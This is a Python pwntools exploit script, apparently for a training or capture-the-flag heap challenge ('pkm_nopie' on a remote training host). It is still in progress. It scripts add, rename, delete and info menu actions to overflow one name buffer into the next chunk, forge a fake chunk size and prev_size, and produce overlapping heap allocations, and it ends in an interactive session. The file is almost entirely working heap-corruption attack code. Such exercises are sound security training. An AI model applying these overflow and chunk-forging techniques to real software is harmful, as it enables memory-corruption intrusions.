#!/usr/bin/python3
from pwn import *
import re
PROGRAM = "./pkm_nopie"
HOST    = "training.jinblack.it"
PORT    = 2025 
LIBC    = "./libc-2.27_notcache.so"
#NX     
#PIE    
#ASLR   

# GDB_c   = """
#     b* 0x401ca4
    
#     command 1
#     x /20gx 0x4040c0 
#     end 
#           """

#b* 0x4013cb  

GDB_c = """
    b* 0x401D42
    command 1
    silent
    heap
"""
if args.GDB:
    r = process(PROGRAM)
    gdb.attach(r, GDB_c)
    input("[!] Waiting for gdb...")
elif args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process(PROGRAM)

pkm_index = 0
free_indexes = []

def add_pkm():
    r.recvuntil("> ")
    r.sendline(b"0")
    r.recvuntil("[*] New PKM!")
    if len(free_indexes) == 0:
            
        global pkm_index 
        pkm_index += 1 
        assert(pkm_index < 51)
        print("Created pkm ", pkm_index-1)
        return pkm_index - 1 
    else:
        index = free_indexes.pop()
        print("Created pkm ",index )
        return index 


def rename_pkm(length, name, index):
    #this function sends only bytes - 
    assert(length == len(name) or name.find("\n"))
    r.recvuntil("> ")
    r.sendline(b"1")
    r.recvuntil("[*] Rename PKM!")
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(index)).encode())
    r.recvuntil("[.] insert length: ")
    r.sendline((str(length)).encode())
    print("WARNING: process reads one char at a time")
    print("We don't want to send new line! -> r.send()")
    r.send(name.encode())
    print("Renamed pkm ", index)


def rename_send(name, index):
    rename_pkm(len(name), name, index)

def rename_sendline(name, index):
    rename_pkm(len(name)+1, name+"\n", index)

def delete_pkm(index):
    r.recvuntil("> ")
    r.sendline(b"2")
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(index)).encode())
    free_indexes.append(index)
    print("Deleted pkm ", index)

def info_pkm(index):
    r.recvuntil("> ")
    r.sendline(b"4")
    r.recvuntil("[*] Info PKMs!")
    r.recvuntil("[*] Choice a PKM!")
    r.recvuntil("> ")
    r.sendline((str(index)).encode())
    print("Info on pkm ", index)
    print(r.recvuntil(" *Moves:"))
    #clean input for the following functions
    r.recvuntil("> ")
    r.sendline((str("7")).encode())
    r.recvuntil("[!] Wrong choice!")

pkm1 = add_pkm()
pkm2 = add_pkm()
pkm3 = add_pkm()
size = 0x120
rename_sendline("A"*size, pkm1)
fake_size = size & (~0x0000ff)
print(hex(fake_size))
assert((size-fake_size-8) > 0)
victim_name = "B"*(fake_size+16) + p64(fake_size).decode()+ "B"*(size-fake_size-16-8)
rename_sendline(victim_name, pkm2)
# rename_send("B"*size, pkm2)
rename_sendline("C"*size, pkm3)


delete_pkm(pkm2)

assert(len(free_indexes) == 1)
print(free_indexes)

rename_send("F"*(size+8), pkm1)



pkm4 = add_pkm()
print(free_indexes)

rename_sendline("U"*176, pkm4)
pkm5 = add_pkm()
pkm6 = add_pkm()


rename_sendline("V"*48, pkm5)

delete_pkm(pkm4)


delete_pkm(pkm3)
print("Before allocating new chunk")
info_pkm(pkm5)
rename_sendline("A"*(176+48+0x120), pkm6)
info_pkm(pkm5)
print("After allocating new chunk")


#addpkm , rename con 176 U, add pkm, rename con 48 V e del pkm3
#
# pk1
# pk2
# pk3
# n1
# n2
# n3
# - del pk2
# rename pk1 -> riesco a modificare prev_size di chunk n3?



# print(pkm2, pkm_index)
# info_pkm(pkm1)
# rename_pkm(56, "Z"*56, pkm1)
# info_pkm(pkm1)

# rename_pkm(48, "B"*48, pkm2)
# print("check renaming")
# info_pkm(pkm2)

# rename_pkm(48, "C"*48, pkm1)
# info_pkm(pkm1)

r.interactive()